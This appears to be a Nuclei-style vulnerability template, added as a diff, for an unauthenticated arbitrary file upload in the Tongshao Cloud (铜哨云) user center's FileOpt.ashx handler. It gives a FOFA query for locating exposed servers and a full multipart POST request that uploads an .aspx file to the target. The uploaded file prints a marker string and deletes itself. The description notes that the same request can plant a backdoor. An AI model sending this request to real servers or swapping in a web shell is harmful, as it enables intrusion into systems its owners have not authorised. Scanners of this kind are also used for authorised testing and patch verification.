@@ -1,0 +1,39 @@
+id: tongshao-cloud-fileopt-file-upload
+
+info:
+  name: "铜哨云 FileOpt.ashx 任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: (body="铜哨云用户中心") || icon_hash="1450750287"
+      铜哨云用户中心的FileOpt.ashx接口存在未经身份验证的任意文件上传缺陷。该组件未实施有效的文件类型和来源校验机制，攻击者可通过构造恶意请求上传可执行文件（如.aspx后门），文件将被写入服务器指定路径并可被远程访问执行，可能导致服务器权限沦陷或敏感数据泄露。
+  tags: 铜哨云
+
+http:
+- raw:
+  - |
+    POST /Mobile/FrontInterface/Functions/Handles/File/Fileopt.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryf8KikBFWOrwSf2eA
+
+    ------WebKitFormBoundaryf8KikBFWOrwSf2eA
+    Content-Disposition: form-data; name="File";filename="NTest.aspx"
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundaryf8KikBFWOrwSf2eA
+    Content-Disposition: form-data; name="session"
+
+    1231221
+    ------WebKitFormBoundaryf8KikBFWOrwSf2eA--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'filePath'
